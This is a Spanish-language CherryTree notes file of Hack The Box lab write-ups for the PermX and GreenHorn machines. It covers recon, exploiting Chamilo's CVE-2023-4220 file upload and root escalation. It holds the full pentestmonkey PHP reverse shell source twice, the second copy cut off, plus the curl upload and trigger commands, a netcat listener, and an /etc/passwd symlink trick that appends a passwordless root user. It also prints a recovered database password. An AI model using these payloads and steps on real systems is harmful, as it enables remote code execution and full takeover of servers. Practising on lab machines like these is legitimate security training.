<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node unique_id="16" master_id="0" name="EASY" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724971667" ts_lastsave="1724973303">
    <rich_text>Solucion de las maquinas que realizo en htb nivel facil.

Sorry por las faltas de ortografia, hackear en ingles y documentar en español toma tiempo, ya que tengo que estar realizando el cambio de idioma, asi que de ante mano les digo que el documento tiene faltas de ortografia.</rich_text>
    <node unique_id="1" master_id="0" name="HTB PermX / easy" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1722183641" ts_lastsave="1724971670">
      <rich_text scale="h1" weight="heavy">ip</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h1" weight="heavy">resultado</rich_text>
      <rich_text scale="h1">
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h1" weight="heavy">Reconocimiento</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

resultado

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <table char_offset="3" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>10.10.11.23</cell>
        </row>
      </table>
      <table char_offset="16" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>linux</cell>
        </row>
        <row>
          <cell>ttl=63</cell>
        </row>
      </table>
      <table char_offset="34" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.23</cell>
        </row>
      </table>
      <table char_offset="48" justification="left" col_min="60" col_max="60" col_widths="0,0,0,75,435">
        <row>
          <cell>22</cell>
          <cell>open</cell>
          <cell>ssh</cell>
          <cell> syn-ack</cell>
          <cell>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</cell>
        </row>
        <row>
          <cell>80</cell>
          <cell>open</cell>
          <cell>http</cell>
          <cell> syn-ack</cell>
          <cell>Apache httpd 2.4.52</cell>
        </row>
        <row>
          <cell>port</cell>
          <cell>state</cell>
          <cell>service</cell>
          <cell>reason</cell>
          <cell>version</cell>
        </row>
      </table>
      <table char_offset="50" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</cell>
        </row>
      </table>
      <node unique_id="2" master_id="0" name="p-80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722184308" ts_lastsave="1724972769">
        <rich_text>			</rich_text>
        <rich_text underline="single" scale="h2" weight="heavy">url encontrada</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">
			</rich_text>
        <rich_text underline="single" scale="h2" weight="heavy">resultados relevantes</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">		</rich_text>
        <rich_text scale="h2" weight="heavy">	</rich_text>
        <rich_text underline="single" scale="h2" weight="heavy">url externa</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>ka
distribuido por
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

			</rich_text>
        <rich_text scale="h2" weight="heavy">Ataque de directorio aplicado</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

reconocimiento de la web
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

resultados
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

CVE de la web
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Intento con sheel 1: 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>ls


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ejecutamos la revershell

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

nos colocamos en escucha

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


ingresamos al servidor y importamos una libreria de python para obtener una bash

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Buscamos la existencia de otros usuarios

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

resultados

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

realizamos una busqueda por ficheros

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

dentro la busqueda encontramos la siguiente linea 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

esto nos da resultados de la configuracion de la base de datos

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vamos a intentar conectarnos por ssh con ese usuario de la db
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2" weight="heavy">flag 1 encontrada dentro de user.txt</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text underline="single" scale="h1" weight="heavy">proceso de escalada de privilegios</rich_text>
        <rich_text>

ejecutamos  
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
para saber que permisos tenemos para ejecutar como este usuario

vemos un script llamado

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

este esript nos permite modificar los permisos dentro del path de /home/mtz

con el comando </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> creamos un link entre </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> y </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> lo que nos va a permitir tener una comunicacion directa con passwd a traves de </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

para que tengamos los permisos tenemos que ejecutar el siguiente comando
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> este comando lo que hace es que a traves de </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> le asigna a </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> los permisos de escritura y lectura </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> al archivo que asignamos con el link  </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> anterior para poder tener acceso y con </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> creamos un root llamado root3 y les damos los mismos permisos de root ya con esto solo ejecutamos 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> y tendremos los privilegios de root 

realizamos un cd..
luego cd ..
luego cd root
y encontramos la flag dentro de root.txt

</rich_text>
        <rich_text scale="h1" weight="heavy">segunda Flag</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

fin















------------------------------------------------

</rich_text>
        <rich_text scale="h2" weight="heavy">otros ataques de VHOST web</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
--------------------------------------------------



</rich_text>
        <table char_offset="18" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://permx.htb/</cell>
          </row>
        </table>
        <table char_offset="20" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>whatweb -v -a 3 http://permx.htb/ </cell>
          </row>
        </table>
        <table char_offset="48" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>Summary   : Apache[2.4.52],</cell>
          </row>
        </table>
        <table char_offset="50" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell> Bootstrap[5.0.0]</cell>
          </row>
        </table>
        <table char_offset="52" justification="left" col_min="60" col_max="60" col_widths="360">
          <row>
            <cell>HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)]</cell>
          </row>
          <row>
            <cell>JQuery[3.4.1]</cell>
          </row>
          <row>
            <cell>Email[permx@htb.com]</cell>
          </row>
        </table>
        <table char_offset="70" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://htmlcodex.com/</cell>
          </row>
        </table>
        <table char_offset="90" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://themewagon.com/</cell>
          </row>
        </table>
        <table char_offset="126" justification="left" col_min="60" col_max="60" col_widths="975,105">
          <row>
            <cell>sudo gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://permx.htb --append-domain | grep -v "Status: 302"</cell>
            <cell>exitoso</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado</cell>
          </row>
        </table>
        <table char_offset="128" justification="left" col_min="60" col_max="60" col_widths="120">
          <row>
            <cell>lms.permx.htb</cell>
          </row>
          <row>
            <cell>resultado</cell>
          </row>
        </table>
        <table char_offset="156" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>whatweb -v -a 3 http://lms.permx.htb/index.php</cell>
          </row>
        </table>
        <table char_offset="170" justification="left" col_min="60" col_max="60" col_widths="345">
          <row>
            <cell>Version      : 2.4.52 (from HTTP Server Header)
Google Dorks: (3)
 Website     : http://httpd.apache.org/</cell>
          </row>
          <row>
            <cell>Apache</cell>
          </row>
        </table>
        <table char_offset="187" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>CVE-2023-4220</cell>
          </row>
        </table>
        <table char_offset="212" justification="left" col_min="60" col_max="60" col_widths="0,165">
          <row>
            <cell>ok</cell>
            <cell>conectado con exito</cell>
          </row>
          <row>
            <cell>enviado con exito</cell>
            <cell>ejecucion</cell>
          </row>
        </table>
        <table char_offset="216" justification="left" col_min="60" col_max="60" col_widths="855">
          <row>
            <cell>&lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?&gt; 



</cell>
          </row>
          <row>
            <cell>shell.php </cell>
          </row>
        </table>
        <table char_offset="222" justification="left" col_min="60" col_max="60" col_widths="1020">
          <row>
            <cell>
curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 

</cell>
          </row>
          <row>
            <cell>envio con exito</cell>
          </row>
        </table>
        <table char_offset="251" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'</cell>
          </row>
        </table>
        <table char_offset="280" justification="left" col_min="60" col_max="60" col_widths="165">
          <row>
            <cell>sudo nc -lvnp 9001</cell>
          </row>
          <row>
            <cell>nc</cell>
          </row>
        </table>
        <table char_offset="366" justification="left" col_min="60" col_max="60" col_widths="405">
          <row>
            <cell>python3 -c 'import pty;pty.spawn("/bin/bash")'</cell>
          </row>
          <row>
            <cell>importamos bash</cell>
          </row>
        </table>
        <table char_offset="411" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cat /etc/passwd | grep -i sh$</cell>
          </row>
        </table>
        <table char_offset="426" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash</cell>
          </row>
        </table>
        <table char_offset="467" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>find ./ | grep “configuration.php” 2&gt;dev/null</cell>
          </row>
        </table>
        <table char_offset="522" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cat ./var/www/chamilo/app/config/configuration.php</cell>
          </row>
        </table>
        <table char_offset="589" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;</cell>
          </row>
        </table>
        <table char_offset="654" justification="left" col_min="60" col_max="60" col_widths="165,165">
          <row>
            <cell>ssh mtz@permx.htb  </cell>
            <cell>03F6lY3uXAP2bkW8</cell>
          </row>
          <row>
            <cell>ruta</cell>
            <cell>passwd</cell>
          </row>
        </table>
        <table char_offset="694" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>e92143d42a9e37aff780769fa514271b</cell>
          </row>
        </table>
        <table char_offset="746" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo -l</cell>
          </row>
        </table>
        <table char_offset="838" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>acl.sh</cell>
          </row>
        </table>
        <table char_offset="933" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>ln -s /etc/passwd /home/mtz/test</cell>
          </row>
        </table>
        <table char_offset="957" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell> /etc/passwd</cell>
          </row>
        </table>
        <table char_offset="961" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/home/mtz/test</cell>
          </row>
        </table>
        <table char_offset="1042" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/home/mtz/test</cell>
          </row>
        </table>
        <table char_offset="1118" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo /opt/acl.sh mtz rw /home/mtz/test</cell>
          </row>
        </table>
        <table char_offset="1164" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo /opt/acl.sh </cell>
          </row>
        </table>
        <table char_offset="1178" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell> mtz</cell>
          </row>
        </table>
        <table char_offset="1216" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>rw</cell>
          </row>
        </table>
        <table char_offset="1256" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/home/mtz/test</cell>
          </row>
        </table>
        <table char_offset="1297" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>echo "root3::0:0:root3:/root:/bin/bash" &gt;&gt; ./test</cell>
          </row>
        </table>
        <table char_offset="1398" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>su root3</cell>
          </row>
        </table>
        <table char_offset="1538" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>e7e6efa0ecbc42942e1a2cc18e60787f</cell>
          </row>
        </table>
        <table char_offset="1638" justification="left" col_min="60" col_max="60" col_widths="795,135">
          <row>
            <cell>sudo ffuf -u http://permx.htb/index.html/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 301</cell>
            <cell>sin resultados</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado </cell>
          </row>
        </table>
        <table char_offset="1641" justification="left" col_min="60" col_max="60" col_widths="660,90">
          <row>
            <cell>sir</cell>
            <cell>cancelado</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado</cell>
          </row>
        </table>
        <table char_offset="1644" justification="left" col_min="60" col_max="60" col_widths="915,90">
          <row>
            <cell>wfuzz --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://permx.htb -H"Host: FUZZ.permx.htb"</cell>
            <cell>detennido</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado</cell>
          </row>
        </table>
      </node>
    </node>
    <node unique_id="3" master_id="0" name="HTB GREENHORN" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722391462" ts_lastsave="1724971673">
      <rich_text>ip= 10.10.11.25

puertos

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)

3000/tcp open  ppp?    syn-ack ttl 63

</rich_text>
      <node unique_id="7" master_id="0" name="p 22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722392257" ts_lastsave="1722392260"/>
      <node unique_id="6" master_id="0" name="p 80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722392240" ts_lastsave="1722488824">
        <rich_text>ip = 10.10.11.25

</rich_text>
        <rich_text scale="h1">webs  encontradas</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Ataques ejecutados 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

buscamos una ruta donde podamos cargar algun tip[o de archivo en este caso es
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

creacion de la revershell

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


nos colocamos en escucha

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

cargamos la shell y esperamos respuesta del servidor

exportamos una bash con python

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

exportamos xterm

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ingresamos a home
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

verificamos permisos
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ingresamos a la carpeta de junior
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vamos a usar la contrase;a encontrada para pasar a ser junior

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

miramos que contiene user.txt

flag 1
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

cambiamos el nombre del archivo pdf
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

abrimos un servidor con python

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

desde otra terminal descargamos el archivo
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vemos que el archivo contiene images y estan pixeladas
vamos a sacarle las imagenes para descifrar el pixelado

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

descargamos la herrmaineta depix para descifrar el pixelado de la imagen

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ejecutamos el siguiente comando dentro de la carpeta de depix

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

salida del archivo despixelado

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

resultado de la imagen nos devuelve la password solo nos queda pegar toda la password y ingresar como root

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

nos volevmos a conectar al servidor enviando la shell maliciosa

y dentro de la maquina ejecutamos 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

y ingresamos la password despixelada, luego entramos al home y capturamos la flag
</rich_text>
        <table char_offset="36" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://greenhorn.htb/</cell>
          </row>
        </table>
        <table char_offset="61" justification="left" col_min="60" col_max="60" col_widths="285,0,180">
          <row>
            <cell>whatweb -v -a 3 http://greenhorn.htb </cell>
            <cell>exitoso</cell>
            <cell>http://greenhorn.htb/</cell>
          </row>
          <row>
            <cell>Ataque</cell>
            <cell>resultado</cell>
            <cell>web</cell>
          </row>
        </table>
        <table char_offset="64" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>HTTP Headers:
        HTTP/1.1 302 Found
        Server: nginx/1.18.0 (Ubuntu)
        Date: Wed, 31 Jul 2024 02:22:09 GMT
        Content-Type: text/html;charset=utf-8
        Transfer-Encoding: chunked
        Connection: close
        Set-Cookie: PHPSESSID=fb7pbv1lpn3d8fgin5137hnip0; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Location: http://greenhorn.htb/?file=welcome-to-greenhorn</cell>
          </row>
        </table>
        <table char_offset="67" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0 (Ubuntu)
        Date: Wed, 31 Jul 2024 02:22:12 GMT
        Content-Type: text/html;charset=utf-8
        Transfer-Encoding: chunked
        Connection: close
        Set-Cookie: PHPSESSID=ibuq4eg738aet82nggisdb2osu; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Content-Encoding: gzip</cell>
          </row>
        </table>
        <table char_offset="70" justification="left" col_min="60" col_max="60" col_widths="660,75,450">
          <row>
            <cell>sudo dirb http://greenhorn.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</cell>
            <cell>exitoso</cell>
            <cell>http://greenhorn.htb/admin.php (CODE:200|SIZE:4026)</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado</cell>
            <cell>resultado</cell>
          </row>
        </table>
        <table char_offset="73" justification="left" col_min="60" col_max="60" col_widths="225">
          <row>
            <cell>http://greenhorn.htb/login.php</cell>
          </row>
          <row>
            <cell>url</cell>
          </row>
        </table>
        <table char_offset="154" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell></cell>
          </row>
          <row>
            <cell>ruta</cell>
          </row>
        </table>
        <table char_offset="184" justification="left" col_min="60" col_max="60" col_widths="750,225">
          <row>
            <cell>&lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
